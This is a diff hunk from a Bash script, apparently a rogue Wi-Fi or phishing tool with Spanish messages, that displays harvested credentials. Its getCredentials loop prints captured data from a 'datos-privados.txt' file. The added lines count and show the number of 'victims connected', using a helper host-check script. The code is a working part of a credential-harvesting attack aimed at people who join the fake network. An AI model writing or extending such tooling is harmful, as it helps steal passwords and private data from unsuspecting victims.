@@ -68,11 +68,14 @@ function dependencies(){
 
 function getCredentials(){
 
+	activeHosts=0
 	tput civis; while true; do
 		echo -e "\n${yellowColour}[*]${endColour}${grayColour} Esperando credenciales (${endColour}${redColour}Ctr+C para finalizar${endColour}${grayColour})...${endColour}\n${endColour}"
 		for i in $(seq 1 60); do echo -ne "${redColour}-"; done && echo -e "${endColour}"
+		echo -e "${redColour}Víctimas conectadas: ${endColour}${blueColour}$activeHosts${endColour}\n"
 		find \-name datos-privados.txt | xargs cat 2>/dev/null
 		for i in $(seq 1 60); do echo -ne "${redColour}-"; done && echo -e "${endColour}"
+		activeHosts=$(bash utilities/hostsCheck.sh | grep -v "192.168.1.1 " | wc -l)
 		sleep 3; clear
 	done
 }
